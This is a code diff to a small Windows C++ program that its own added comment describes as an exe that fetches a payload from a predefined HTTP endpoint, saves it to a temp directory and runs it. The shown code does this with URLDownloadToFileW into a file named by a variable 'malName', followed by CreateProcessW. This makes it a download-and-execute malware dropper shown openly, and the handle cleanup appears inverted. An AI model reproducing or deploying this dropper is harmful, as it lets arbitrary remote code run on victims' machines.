@@ -1,3 +1,11 @@
+/****************************
+ *  A simple exe that retrieves
+ *  a payload from a predefined
+ *  http endpoint, saves it in
+ *  a temp dir, and creates a 
+ *  process for the payload.
+ * **************************/
+
 #include <urlmon.h>
 #include <windows.h>
 #include <tchar.h>
@@ -16,16 +24,16 @@ int _tmain(int argc, _TCHAR *argv[]){
     wchar_t buffer[MAX_PATH];
     PathCombineW(buffer, tempPath, malName );
 
-    STARTUPINFO si;
+    STARTUPINFOW si;
 	PROCESS_INFORMATION pi;
     memset(&si, 0, sizeof(si));
     si.cb = sizeof(si);
 
     DeleteUrlCacheEntryW(URL);
 
-    auto status = URLDownloadToFileW(NULL,URL, buffer, 0 , NULL);
+    HRESULT status = URLDownloadToFileW(NULL, URL, buffer, 0, NULL);
     if (SUCCEEDED(status)){
-        if (!CreateProcessW(nullptr, (LPWSTR) buffer, nullptr, nullptr, FALSE, 0, nullptr, nullptr,  &si, &pi)){
+        if (!CreateProcessW(NULL, (LPWSTR) buffer, NULL, NULL, FALSE, 0, NULL, NULL,  &si, &pi)){
             CloseHandle(pi.hProcess);
         }
     }
